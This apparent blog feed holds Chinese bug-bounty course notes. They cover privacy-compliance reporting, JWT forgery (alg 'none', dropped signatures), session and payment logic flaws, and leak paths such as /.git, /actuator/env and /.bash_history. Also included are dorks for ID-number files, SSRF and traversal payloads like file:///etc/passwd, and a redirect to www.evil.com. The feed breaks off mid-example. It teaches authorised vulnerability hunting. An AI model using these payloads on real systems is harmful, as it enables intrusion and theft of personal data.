    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>隐私合规漏洞第1,2课。</p><span id="more"></span><h1 id="隐私政策"><a href="#隐私政策" class="headerlink" title="隐私政策"></a>隐私政策</h1><p>隐私政策是独立于用户协议的，需要公开APP所有处理规则和基本情况，包括开办主体的基本信息，APP对个人信息收集、使用、共享及披露开办主体的基本信息，APP对个人信息收集、使用、共享及披露的基本情况，用户对于处理自己信息的基本权利，包括查看（无隐私政策或隐私政策无法打开的APP）、删除（能否撤销授权或删除个人相关信息，如地址，身份证等）、注销（能否注销账号）、投诉等以及政策发布、生效或更新日期。</p><p>隐私政策描述的情况也需要符合APP实际情形，例如隐私政策中对于注销、投诉提供的操作方法，需与APP内实际操作路径相一致。（不一致即可提交，最高到严重）</p><p>另外，对于业务开展目标用户为14周岁以下的儿童，需要有专门的儿童个人信息保护规则。过世人员也需留意。</p><h1 id="等级判定"><a href="#等级判定" class="headerlink" title="等级判定"></a>等级判定</h1><p>首先按企业的评分标准，如果在评分标准中未说明，自评高危即可。</p><h1 id="隐私合规漏洞参考标准"><a href="#隐私合规漏洞参考标准" class="headerlink" title="隐私合规漏洞参考标准"></a>隐私合规漏洞参考标准</h1><ol><li>关于印发《App违法违规收集使用个人信息行为认定方法》的通知</li><li>关于印发《常见类型移动互联网应用程序必要个人信息范围规定》的通知</li><li>工业和信息化部关于k开展纵深推进App侵害用户权益专项整治行动的通知</li><li>个人信息安全规范</li><li>App收集使用个人信息最小必要评估规范</li><li>《中华人民共和国个人信息保护法》</li></ol><h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><h2 id="用户默认同意隐私政策—违规"><a href="#用户默认同意隐私政策—违规" class="headerlink" title="用户默认同意隐私政策—违规"></a>用户默认同意隐私政策—违规</h2><ol><li>App首次运行</li><li>注册&#x2F;登录环节</li><li>收集使用个人信息的目的、方式、范围发生变化时</li><li>现版本没有主动提醒的（即使文本内容不变）</li></ol><p>弹窗内简要说明《隐私政策》要点</p><ol><li>点击跳转《隐私政策》详情页面</li><li>给予用户2个选择，同意或拒绝。在用户点同意之前，禁止任何的数据收集；用户选择拒绝后，可提示即将退出app（点拒绝直接退出违规，二次确认不违规）</li></ol><p>“注册即同意《用户协议》和《隐私政策》”，如果该方框默认勾上，则违规。<br>此方框需要用户勾选。</p><p>在注册登录环节需要再次提醒用户查看，一般会采用勾选框等形式。也要确保用户进入App后能随时查看隐私政策，一般要求在4次以内点击就能阅读到。所有地方的隐私政策内容需保持一致。</p><h2 id="用户默认同意隐私政策报告—示例（需最新版本）"><a href="#用户默认同意隐私政策报告—示例（需最新版本）" class="headerlink" title="用户默认同意隐私政策报告—示例（需最新版本）"></a>用户默认同意隐私政策报告—示例（需最新版本）</h2><p>标题：xx app 1.1.1版本存在默认用户同意隐私政策漏洞<br>内容：<br>在小米官方商店，下载 xx app最新版，版本xxx<br>打开app，输入手机号注册，发现左下角默认同意了该隐私政策</p><p>【图片证据】</p><p>此行为违反了xx规定的第x条</p><p>修复建议：<br>这个勾选应该由用户自己勾选，并非系统默认代替用户点击同意。</p><h2 id="收集手机号（不挖）"><a href="#收集手机号（不挖）" class="headerlink" title="收集手机号（不挖）"></a>收集手机号（不挖）</h2><p>并不是所有的功能都需要手机号实名。</p><h2 id="用户拒绝提供不必要的信息直接退出app—违规"><a href="#用户拒绝提供不必要的信息直接退出app—违规" class="headerlink" title="用户拒绝提供不必要的信息直接退出app—违规"></a>用户拒绝提供不必要的信息直接退出app—违规</h2><p>用户注册过程所收集的信息应遵循最小必要信息相关要求，当用户拒绝提供非最小必要信息或用户拒绝最小必要权限列表以外的权限时，是不能影响继续注册或使用基本功能服务。当然相对于基本信息外的其它附加功能，也是可以根据产品定位收集额外用户信息。</p><h2 id="注销功能"><a href="#注销功能" class="headerlink" title="注销功能"></a>注销功能</h2><p>有注册功能就对应要有注销功能。<br>App要提供有效并且简单易操作的账号注销功能，同时注销条件限制合理。<br>合理的方式：如注销提供条件不能多于注册时的条件。使用联合登录方式的账号注销，仅应解除关联或匿名化处理本app内账号关联信息。</p><h2 id="权限获取要求"><a href="#权限获取要求" class="headerlink" title="权限获取要求"></a>权限获取要求</h2><ol><li><p>目的声明<br>发起权限申请前，应以弹窗形式提前说明申请权限的场景，目的，将会收集的信息。</p></li><li><p>用户交互<br>若用户同意授权，开始收集对应权限的信息或行使对应权限功能。</p></li><li><p>若用户拒绝授权，则提供一个静态页面说明申请权限的理由引导用户授权。当用户再次主动使用所需权限对应的功能时，触发弹窗申请。否则弹窗申请频率不能低于48小时一次。</p></li></ol><h2 id="APP申请权限"><a href="#APP申请权限" class="headerlink" title="APP申请权限"></a>APP申请权限</h2><ol><li>场景化申请</li><li>申请敏感权限需要向用户明示收集使用的目的和用途。</li><li>敏感权限为可收集个人信息的权限，举例如下：<br>ios系统：IDFA，定位，通讯录，日历，提醒事项，照片，麦克风，相机，健康<br>Android系统：定位，通讯录，日历，存储，相机，麦克风，电话，短信，应用安装列表，身体传感器。</li><li>具体实现可采用弹框，占位页等形式进行说明申请权限的理由。在APP使用中，若用户明确拒绝授权，则不能频繁申请权限。不频繁的申请频率应为超过48小时再次申请。</li></ol><h2 id="身份证号"><a href="#身份证号" class="headerlink" title="身份证号"></a>身份证号</h2><p>实名认证若涉及到人脸识别，需单独告知用户收集使用的方式，目的，范围以及存储时间等。</p><h2 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h2><ol><li>应当有关闭“个性化推荐”的按钮，否则违规。</li><li>个人信息保护法中提到“通过自动化决策方式向个人进行信息…”</li><li>涉及到开屏广告，要确保能一键关闭，不可利用文字、整屏图片、视频等方式欺骗用户跳转，应当在广告内容中显著标明警示语，告知用户点击将跳转至第三方应用，确保用户知情。</li></ol><h2 id="用户投诉"><a href="#用户投诉" class="headerlink" title="用户投诉"></a>用户投诉</h2><p>涉及人工处理的，承诺处理时限应不超过15个工作日。否则违规。</p><h2 id="未成年人用户管理和成年人用户需不同"><a href="#未成年人用户管理和成年人用户需不同" class="headerlink" title="未成年人用户管理和成年人用户需不同"></a>未成年人用户管理和成年人用户需不同</h2><ol><li>未成年和成年管理应有不同。</li><li>需设置青少年模式。</li></ol><h2 id="接入SDK服务的注意事项（初学不建议，需会移动安全抓包）"><a href="#接入SDK服务的注意事项（初学不建议，需会移动安全抓包）" class="headerlink" title="接入SDK服务的注意事项（初学不建议，需会移动安全抓包）"></a>接入SDK服务的注意事项（初学不建议，需会移动安全抓包）</h2><p>SDK的合理合规配置。</p><h2 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a>小程序</h2><p>小程序合规和APP基本一致</p><h2 id="小米手机检测自启动跟用户程序检索"><a href="#小米手机检测自启动跟用户程序检索" class="headerlink" title="小米手机检测自启动跟用户程序检索"></a>小米手机检测自启动跟用户程序检索</h2><p>使用小米的应用行为记录。确保用户信息。</p><h2 id="收隐私合规漏洞的企业"><a href="#收隐私合规漏洞的企业" class="headerlink" title="收隐私合规漏洞的企业"></a>收隐私合规漏洞的企业</h2><p>途虎，麦当劳，爱奇艺，小米，金山</p><h2 id="价格"><a href="#价格" class="headerlink" title="价格"></a>价格</h2><ol><li><p>爱奇艺标准：<br>低危：30-50<br>中危：100-300<br>高危：400-600</p></li><li><p>小米标准<br>高危漏洞：300-500（贡献币）<br>中危漏洞：80-120（贡献币）<br>低危漏洞：10-30（贡献币）<br>注：1贡献币&#x3D;10元</p></li></ol><h1 id="隐私合规第2课"><a href="#隐私合规第2课" class="headerlink" title="隐私合规第2课"></a>隐私合规第2课</h1><h2 id="申请相机权限未告知用户目的"><a href="#申请相机权限未告知用户目的" class="headerlink" title="申请相机权限未告知用户目的"></a>申请相机权限未告知用户目的</h2><p>违反了191号文件《App违法违规收集使用个人信息行为认定方法》中第二类第3条</p><p>修复建议：应该在动态申请相机权限时说明使用该权限的目的，例如：用于扫码登录，拍照上传头像等，根据实际业务来写。</p><h2 id="首次运行未经用户阅读并同意隐私政策，申请获取位置权限"><a href="#首次运行未经用户阅读并同意隐私政策，申请获取位置权限" class="headerlink" title="首次运行未经用户阅读并同意隐私政策，申请获取位置权限"></a>首次运行未经用户阅读并同意隐私政策，申请获取位置权限</h2><h2 id="登录页面无主动提供勾选等方式提示用户阅读隐私政策收集使用规则"><a href="#登录页面无主动提供勾选等方式提示用户阅读隐私政策收集使用规则" class="headerlink" title="登录页面无主动提供勾选等方式提示用户阅读隐私政策收集使用规则"></a>登录页面无主动提供勾选等方式提示用户阅读隐私政策收集使用规则</h2><h2 id="打开xx小程序时首次运行未通过弹窗主动勾选等方式体时用户阅读隐私政策"><a href="#打开xx小程序时首次运行未通过弹窗主动勾选等方式体时用户阅读隐私政策" class="headerlink" title="打开xx小程序时首次运行未通过弹窗主动勾选等方式体时用户阅读隐私政策"></a>打开xx小程序时首次运行未通过弹窗主动勾选等方式体时用户阅读隐私政策</h2><h2 id="测试点为工信部164号文重点要求的用户IMEI，IMSI，应用程序列表等个人信息收集合规"><a href="#测试点为工信部164号文重点要求的用户IMEI，IMSI，应用程序列表等个人信息收集合规" class="headerlink" title="测试点为工信部164号文重点要求的用户IMEI，IMSI，应用程序列表等个人信息收集合规"></a>测试点为工信部164号文重点要求的用户IMEI，IMSI，应用程序列表等个人信息收集合规</h2><p>首次APP打开还未登录就开始在后台收集应用程序列表</p><h2 id="个人隐私政策中出现错别字"><a href="#个人隐私政策中出现错别字" class="headerlink" title="个人隐私政策中出现错别字"></a>个人隐私政策中出现错别字</h2><h2 id="小程序未提供有效注销用户账号功能"><a href="#小程序未提供有效注销用户账号功能" class="headerlink" title="小程序未提供有效注销用户账号功能"></a>小程序未提供有效注销用户账号功能</h2><h2 id="强制收集用户联系方式（与隐私政策描述不符）"><a href="#强制收集用户联系方式（与隐私政策描述不符）" class="headerlink" title="强制收集用户联系方式（与隐私政策描述不符）"></a>强制收集用户联系方式（与隐私政策描述不符）</h2><h2 id="字体加粗"><a href="#字体加粗" class="headerlink" title="字体加粗"></a>字体加粗</h2><p>未对重点信息加粗</p><h2 id="无法访问隐私政策"><a href="#无法访问隐私政策" class="headerlink" title="无法访问隐私政策"></a>无法访问隐私政策</h2><h2 id="隐私合规测试清单"><a href="#隐私合规测试清单" class="headerlink" title="隐私合规测试清单"></a>隐私合规测试清单</h2><ol><li>隐私政策文本中未逐一列出App收集使用个人信息目的，类型，收集方式等内容。可制作表格清单，包括APP功能，权限，个人信息类型，目的。<br>共享个人信息和委托处理个人信息的第三方清单（包括嵌入的第三方代码，插件）至少需要在隐私政策中列出1、对外共享，转让，公开披露个人信息的目的2、涉及的个人信息类型3、接收方类型或身份</li><li>隐私政策文本中使用概述文字描述收集的个人信息类型。如：包括但不限于，例如，等</li><li>隐私政策未以单独成文的形式发布，作为用户协议、用户说明，或在其它文件中存在的个人信息保护相关条款文件中的一部分存在</li><li>隐私政策未说明app运营者的基本情况：公司名称，联系地址，个人信息保护联系方式</li><li>隐私政策中未明确政策更新日期</li><li>隐私政策文本中未显著标识个人敏感信息（字体加粗，标型号等）的，视为未对收集个人敏感信息进行充分告知</li><li>隐私政策文本中有关收集使用规则的内容晦涩难懂，冗长繁琐，让用户难以理解，如使用大量专业术语等。（不建议挖）</li><li>隐私政策，未对个人信息的查询，更新，删除，注销以及用户撤回已同意授权等操作方式进行明确说明。</li><li>隐私政策文本中未描述个人信息安全投诉，举报渠道。</li><li>举报渠道不可用，如果是总机电话为提供个人信息保护分机，热线电话未提供菜单键</li><li>未说明个人信息存储期限，超期处理方式</li><li>如使用定向推送，提升用户体验，用户画像等自动化决策功能，隐私政策文本中未明确说明关闭提供关闭选项。</li><li>如果存在个人信息出境，隐私政策文本中未将出境个人信息类型逐项列出并显著标识。若不存在个人信息出境情形也需说明。</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;隐私合规漏洞第1,2课。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_12</title>
    <link href="http://example.com/2023/12/18/SRC_course_12/"/>
    <id>http://example.com/2023/12/18/SRC_course_12/</id>
    <published>2023-12-17T16:00:00.000Z</published>
    <updated>2023-12-18T06:31:02.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本课内容主要是补充之前没讲到的。逻辑漏洞新课程第1节。</p><span id="more"></span><h1 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h1><p>定义: JWT全称json web token，是一种使用json为数据载体，通过对称与非对称对数据进行加密，可以保证数据输出的时候不修改，一般用于认证Authentication与授权Authorization<br>靶场: <code>https://github.com/h-a-c/jwt-lab</code><br>解密站点: <code>https://jwt.io</code><br>特征：以eyJ开头，以点号(.)分为三个部分的数据。</p><p>格式：<br>Header 声明算法及其它参数<br>payload 声明各种数据，明文传输，如id、user等<br>Signature对header和payloadj进行签名，签名方式在header</p><p>认证流程：</p><ol><li>登录 user&#x3D;abc&amp;pwd&#x3D;123 返回包：token&#x3D;[jwt内容]</li><li>Auth: eyJxxx.xxx.xxx user  (直接把jwt当作是cookie，修改jwt即可)</li></ol><p>案例1：</p><ol><li>修改签名算法：手动调整JWT的header，将算法改为none，构造后提交: {“alg”:”none”,”typ”:”JWT”}</li><li>删除签名：当服务端配置不当的时候，可能出现不校验JWT签名的场景。删除JWT的signature后服务器仍接收token，那么可以伪造任意身份了。</li></ol><p>案例2：</p><ol start="3"><li><p>报错导致泄露签名信息：JWT的payload不应包含任何敏感信息（如密码），如果base64 deacode后包含敏感信息，就可以加以利用。另类似CVE-2019-7644，在customErrors配置签名返回的报错信息包含正确签名</p></li><li><p>爆破密钥</p></li></ol><h1 id="session覆盖"><a href="#session覆盖" class="headerlink" title="session覆盖"></a>session覆盖</h1><p>案例1:<br>浏览器打开两个重置密码的网页，过程总共有3步：确认账号(自行输入账号)，安全验证，重置密码<br>第1个网页的账号是自己的，第2个网页的账号是别人的。<br>第1个网页的步骤来到第3步重置密码，输入新密码。<br>第2个网页在第1步确认账号，点击确定到下一步。<br>最后第1个网页点最后的确认，即可更改第2个网页账号的密码。</p><p>案例2：<br>抓包发现userId，更改后，返回包内容token部分发现jwt，再将jwt放在请求包替换，即可越权登录。</p><h1 id="支付漏洞的覆盖操作"><a href="#支付漏洞的覆盖操作" class="headerlink" title="支付漏洞的覆盖操作"></a>支付漏洞的覆盖操作</h1><p>场景：<br>一个平台有青铜会员和铂金会员两种。<br>一年：青铜会员33元，铂金会员45元。<br>一周：青铜会员1元，铂金会员2元。</p><p>操作方式：<br>先购买1年青铜会员，再购买1年铂金会员。结果铂金会员变成2年。或者先买1年青铜再买1周铂金，也是1年铂金。</p><h1 id="付费简历模板"><a href="#付费简历模板" class="headerlink" title="付费简历模板"></a>付费简历模板</h1><p>页面存在付费模板和免费模板。<br>免费模板可预览，可编辑，导出到本地。付费模板只能先选择购买，无法点击预览。</p><p>操作方式（前端越权）：<br>F12，将免费模板可预览的代码复制。然后将代码粘贴到付费模板。<br>此时付费模板即可预览。</p><h1 id="spring技巧-1"><a href="#spring技巧-1" class="headerlink" title="spring技巧-1"></a>spring技巧-1</h1><p><code>https://xxx.com/swagger-resources</code><br>用默认字典去扫，可以看到显示为：<br><code>[&#123;&quot;name&quot;:&quot;default&quot;,&quot;location&quot;:&quot;/--internal--/swgr&quot;,&quot;swaggerVersion&quot;:&quot;2.0&quot;&#125;]</code></p><p>此时选择做一个拼接：<br>拼接路径(价值10元): <code>https://xxx.com/--internal--/swgr</code><br>重点关注paths路径，看一下请求方法，是get还是post，直接去跑目录<br>例如： <code>/--internal--/mgmt/env/</code> 如果返回401，则说明有鉴权，放弃<br><code>/user/messages/&#123;userMsgld&#125;</code>  显示unauthorized，则说明有鉴权，放弃</p><h1 id="spring技巧-2"><a href="#spring技巧-2" class="headerlink" title="spring技巧-2"></a>spring技巧-2</h1><p>swagger界面：监控平台控制台API文档</p><p>操作方式： 首先点右上角Try it out，然后点id*required，加上相应的值，最后点Execute。<br>抓包查看是否成功。<br>成功则说明可以造成越权操作。<br>不仅可以挖越权，还有注入，XSS，上传等等。</p><h1 id="host碰撞漏洞"><a href="#host碰撞漏洞" class="headerlink" title="host碰撞漏洞"></a>host碰撞漏洞</h1><p>host碰撞不是漏洞，只是找到一个资产（不可提交）</p><p>操作方式：打开某个内网，一般无法访问。本地配置host文件，再访问即可。<br>host碰撞工具: <code>https://github.com/fofapro/Hosts_scan</code></p><h1 id="空白页对抗"><a href="#空白页对抗" class="headerlink" title="空白页对抗"></a>空白页对抗</h1><p>通过findsomething，查找接口。找到隐藏信息。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本课内容主要是补充之前没讲到的。逻辑漏洞新课程第1节。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_10</title>
    <link href="http://example.com/2023/12/17/SRC_course_10/"/>
    <id>http://example.com/2023/12/17/SRC_course_10/</id>
    <published>2023-12-16T16:00:00.000Z</published>
    <updated>2023-12-17T13:13:53.522Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>捡漏洞。漏洞课程第5节。</p><span id="more"></span><h1 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h1><h2 id="案例1–目录文件泄露"><a href="#案例1–目录文件泄露" class="headerlink" title="案例1–目录文件泄露"></a>案例1–目录文件泄露</h2><p>直接访问web应用存在的一些目录，如果返回文件列表信息，证明存在此漏洞。（一般需要有敏感文件）</p><p>挖掘方法：Google Hacking 语法: intext:Index of &#x2F;</p><h2 id="案例2–git源码泄露"><a href="#案例2–git源码泄露" class="headerlink" title="案例2–git源码泄露"></a>案例2–git源码泄露</h2><p>利用工具GitHack.py( <code>https://github.com/lijiejie/GitHack</code> )<br><code>python GitHack.py https://ip/.git/</code> 即可将源码下载</p><h2 id="案例3–svn信息泄露"><a href="#案例3–svn信息泄露" class="headerlink" title="案例3–svn信息泄露"></a>案例3–svn信息泄露</h2><p>利用工具: <code>https://github.com/admintony/svnExploit</code><br>示例: <code>xx.com/lab2/.svn/entries</code></p><h2 id="案例4–DS-Store文件泄露-htacess泄露"><a href="#案例4–DS-Store文件泄露-htacess泄露" class="headerlink" title="案例4–DS_Store文件泄露, htacess泄露"></a>案例4–DS_Store文件泄露, htacess泄露</h2><p>利用脚本: <code>https://github.com/lijiejie/ds_store_exp</code></p><p>漏洞示例: <code>https://www.example.com/.DS_Store</code><br><code>https://www.example.com/.htacess</code></p><h2 id="案例5–泄露合集"><a href="#案例5–泄露合集" class="headerlink" title="案例5–泄露合集"></a>案例5–泄露合集</h2><p>druid未授权访问漏洞<br><code>ip/druid/index.html  ## Druid Index</code><br><code>ip/druid/sql.html  ## Druid sql监控页面</code><br><code>ip/druid/weburi.html  ## Druid Web URI监控页面</code><br><code>ip/druid/websession.html  ## Druid Web Session监控页面</code><br><code>json:ip/druid/webrui.json  ## Druid Web URI json</code><br><code>ip/druid/websession.json  ## Druid Web Session json</code><br>Druid 登录接口: <code>ip/druid/login.html  ## Druid登录认证页面Druid未授权访问路径</code></p><p><strong>其它泄露</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/debug/pprof/cmdline</span><br><span class="line">/.DS_Store</span><br><span class="line">/.git/index/</span><br><span class="line">/.svn/entries</span><br><span class="line">/graphql</span><br><span class="line">/tenant</span><br><span class="line">/sources</span><br><span class="line">/actuators/env/</span><br><span class="line">/swagger-ui.html</span><br></pre></td></tr></table></figure><p>Spring的env泄露<br><code>/actuator/env</code></p><p>Spring泄露（可测接口）<br><code>/swagger-ui.html</code></p><p><code>/.bashrc</code> 个人配置记录<br><code>/.ssh/authorized_keys</code> 公钥<br><code>/.bash_history 泄露了站点服务器所有的操作记录</code></p><p>sql查询语句泄露（报错即可）</p><h2 id="补充案例1–测试环境"><a href="#补充案例1–测试环境" class="headerlink" title="补充案例1–测试环境"></a>补充案例1–测试环境</h2><p>测试环境漏洞环境<br>资产脆弱点一般在测试环境</p><ol><li>一般的测试开发环境，域名中总会带有一些特别的标记来识别，如常见的一些 <code>dev.xxx.com stc.xxx.com stm.xxx.com cmm..xxx.com test.xxx.com</code> 等等</li><li>某些SRC平台在他们的评分标准中已经整理出一些测试域名，如oppsrc: OSRC OPPO自有业务的测试环境，包括且不限于域名中含有dev、test，或业务为开发测试之用，或域名属于: <code>*.wanyol.com  *.myoas.net</code></li></ol><h2 id="补充案例2–网盘"><a href="#补充案例2–网盘" class="headerlink" title="补充案例2–网盘"></a>补充案例2–网盘</h2><p>威胁情报获取（网盘）<br>通过企业名+关键词的方法进行排查，常见关键词有：<br>合同，设计图纸，身份证，通讯录，花名册，报表，投标文件，入职等。<br>情报提交时说明网盘链接h和截图，方便厂商排查即可。<br>推荐网盘搜索引擎：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.lingfengyun.com/</span><br><span class="line">https://www.quzhuanpan.com/</span><br><span class="line">https://www.pansoso.com/</span><br><span class="line">https://wp.soshoulu.com/</span><br></pre></td></tr></table></figure><h2 id="补充案例3–浏览器"><a href="#补充案例3–浏览器" class="headerlink" title="补充案例3–浏览器"></a>补充案例3–浏览器</h2><p>威胁情报获取（浏览器）<br>Google搜索payload(文件类型+根域+关键词)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filetype:xls site:xxx.example.com sfzh</span><br><span class="line">filetype:xls site:xxx.example.com 身份证号</span><br><span class="line">filetype:pdf site:xxx.example.com sfzh</span><br><span class="line">filetype:pdf site:xxx.example.com 身份证号</span><br></pre></td></tr></table></figure><p>bing搜payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inurl:example inurl:PDF 机密等级 ABC</span><br><span class="line">inurl:/backup intitle:index of backup intext:*sql site:xxx.example.com</span><br></pre></td></tr></table></figure><h2 id="补充案例4–可能错过的漏洞"><a href="#补充案例4–可能错过的漏洞" class="headerlink" title="补充案例4–可能错过的漏洞"></a>补充案例4–可能错过的漏洞</h2><p>需要二次认证的账号（拿到账号密码，虽然进不去，可以直接提交）</p><h2 id="补充案例5–网站被黑信息"><a href="#补充案例5–网站被黑信息" class="headerlink" title="补充案例5–网站被黑信息"></a>补充案例5–网站被黑信息</h2><p>在该URL处：<code>http://xx.com/js/dywe.js</code> ,访问js，在sidmap参数处可以看到很多url，访问发现为与xxx无关的恶意请求</p><h1 id="具体案例"><a href="#具体案例" class="headerlink" title="具体案例"></a>具体案例</h1><h2 id="刷赞"><a href="#刷赞" class="headerlink" title="刷赞"></a>刷赞</h2><p>返回包中出现存在点赞数量，修改数量即可。</p><h2 id="日志泄露"><a href="#日志泄露" class="headerlink" title="日志泄露"></a>日志泄露</h2><p>发现日志记录直接提交</p><h2 id="上传XSS"><a href="#上传XSS" class="headerlink" title="上传XSS"></a>上传XSS</h2><p>除了普通的上传xss文件，还可以上传svg格式的xss</p><h2 id="XXL-JOB-任务调度中心-反弹getshell"><a href="#XXL-JOB-任务调度中心-反弹getshell" class="headerlink" title="XXL-JOB(任务调度中心)-反弹getshell"></a>XXL-JOB(任务调度中心)-反弹getshell</h2><p>xxl-job命令执行<br><code>https://xxx.com/toLogin</code><br>存在弱口令<br>可利用任务调度执行反弹shell</p><h2 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h2><p>利用工具</p><h2 id="app-XSS"><a href="#app-XSS" class="headerlink" title="app XSS"></a>app XSS</h2><p>app的XSS比较多</p><h1 id="场景案例"><a href="#场景案例" class="headerlink" title="场景案例"></a>场景案例</h1><h2 id="抽奖场景"><a href="#抽奖场景" class="headerlink" title="抽奖场景"></a>抽奖场景</h2><p>从“中奖用户”这个点：尝试查看用户敏感信息，如手机号<br>从“抽奖”这个点：尝试并发，重放。还有修改抽奖积分为负值。<br>从“抽奖记录”这个点：尝试越权查看其它用户信息。<br>从“赚积分”这个点：尝试大量赚取积分。</p><p>注意隐藏参数</p><p>在线客服：尝试XSS</p><p>抓包的userId，找到没被加密的id。</p><h2 id="论坛场景"><a href="#论坛场景" class="headerlink" title="论坛场景"></a>论坛场景</h2><p>发布问题添加payload</p><ol><li>利用位置绕过</li><li>app，小程序绕过</li><li>fuzz</li></ol><p>获取匿名用户的真实用户信息</p><h2 id="付费课程场景"><a href="#付费课程场景" class="headerlink" title="付费课程场景"></a>付费课程场景</h2><p>在观看试听课程点“章节”，抓包<br>查找m3u8文件链接。（m3u8是视频流文件）<br>可以直接在m3u8在线网站播放。</p><h2 id="通用思路"><a href="#通用思路" class="headerlink" title="通用思路"></a>通用思路</h2><p>场景：企业邮箱注册。<br>常规注册：利用本公司的公司邮箱注册<br>绕过：抓包，修改邮箱。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;捡漏洞。漏洞课程第5节。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SRC_course_11</title>
    <link href="http://example.com/2023/12/17/SRC_course_11/"/>
    <id>http://example.com/2023/12/17/SRC_course_11/</id>
    <published>2023-12-16T16:00:00.000Z</published>
    <updated>2023-12-17T14:57:59.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SSRF，CSRF，任意文件读取&#x2F;下载，URL跳转的区别。漏洞课程第6节。</p><span id="more"></span><h1 id="区分"><a href="#区分" class="headerlink" title="区分"></a>区分</h1><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>服务端请求伪造。</p><p>场景：<br>无法打开(内网): <code>oa.a.com</code><br>能够打开(外网): <code>www.a.com</code><br>假设存在ssrf漏洞: <code>www.a.com?url=oa.a.com</code> ，可回显oa页面。页面地址栏链接: <code>www.a.com?url=oa.a.com</code><br>构造链接: <code>http://www.example.com?url=http://22ss.dnslog.cn</code> ，如果显示ip是该网站ip，则可进行下一步利用。（自行查找进入内网地址）<br>利用方式: <code>http://www.a.com?url=http://192.168.1.1</code>  或  <code>http://www.a.com?url=file:///etc/passwd</code></p><h2 id="CSRF-修改密码-中危，二次利用的退出登录-低危100元，删除订阅-低危80元"><a href="#CSRF-修改密码-中危，二次利用的退出登录-低危100元，删除订阅-低危80元" class="headerlink" title="CSRF(修改密码:中危，二次利用的退出登录:低危100元，删除订阅:低危80元)"></a>CSRF(修改密码:中危，二次利用的退出登录:低危100元，删除订阅:低危80元)</h2><p>场景示例（适用于GET存在CSRF）：<br>社区的一个功能站，发帖子，个人中心可以上传头像，评论。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST: /pro/1 1.1</span><br><span class="line">Host: xxxx</span><br><span class="line"></span><br><span class="line">Username=abc&amp;images=http://www.xxx.com/logout&amp;type=2</span><br></pre></td></tr></table></figure><p>当其他人访问个人主页的时候，头像一般来说都是自动加载的，那么如果这块这个 <code>http://www.xxx.com/logout</code> 存在csrf漏洞，就可以立马让访问者退出登录。</p><p><strong>利用插件</strong></p><h2 id="任意文件读取-x2F-瞎子啊"><a href="#任意文件读取-x2F-瞎子啊" class="headerlink" title="任意文件读取&#x2F;瞎子啊"></a>任意文件读取&#x2F;瞎子啊</h2><p>链接构造示例: <code>http://www.example.com?url=../../etc/passwd</code></p><h2 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h2><p>链接构造示例: <code>http://www.example.com?url=http://www.evil.com</code><br>页面回显链接: <code>http://www.evil.com</code></p><h1 id="SSRF案例"><a href="#SSRF案例" class="headerlink" title="SSRF案例"></a>SSRF案例</h1><h2 id="案例1–参数"><a href="#案例1–参数" class="headerlink" title="案例1–参数"></a>案例1–参数</h2><p>根据参数寻找<br>如果不知道哪个参数，逐个尝试。<br>GET示例: <code>http://xx.com/prxoy.php?name=1&amp;pwd=11&amp;src_url=file:///etc/passwd</code><br>POST示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 